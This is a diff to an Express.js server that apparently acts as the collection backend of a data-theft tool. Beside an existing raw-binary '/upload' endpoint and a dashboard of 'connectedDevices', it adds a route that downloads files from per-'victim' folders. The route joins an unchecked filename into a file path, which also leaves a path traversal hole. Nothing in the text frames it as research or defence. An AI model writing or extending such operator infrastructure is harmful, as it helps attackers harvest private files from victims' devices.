@@ -39,7 +39,6 @@ app.get('/dashboard/', (req, res) => {
   res.sendFile(path.join(__dirname, 'dashboard', 'index.html'));
 });
 
-
 // Middleware to handle raw binary data for file uploads
 app.use(express.raw({ type: 'application/octet-stream', limit: '100mb' }));
 
@@ -187,6 +186,34 @@ app.post('/upload', (req, res) => {
 // Route to provide dashboard data
 app.get('/dashboard-data', (req, res) => {
   res.json(connectedDevices);
+});
+
+// Route to download files
+app.get('/download/:victimId/:filename', (req, res) => {
+  try {
+    const { victimId, filename } = req.params;
+    
+    if (!victimFolders[victimId]) {
+      return res.status(404).json({ error: 'Victim folder not found' });
+    }
+
+    const victimFolder = victimFolders[victimId];
+    const filePath = path.join(victimFolder, filename);
+
+    if (!fs.existsSync(filePath)) {
+      return res.status(404).json({ error: 'File not found' });
+    }
+
+    res.download(filePath, filename, (err) => {
+      if (err) {
+        console.error(`❌ Error sending file:`, err);
+        res.status(500).json({ error: 'Error sending file' });
+      }
+    });
+  } catch (error) {
+    console.error(`❌ Error in download route:`, error);
+    res.status(500).json({ error: 'Internal server error' });
+  }
 });
 
 // Start the server
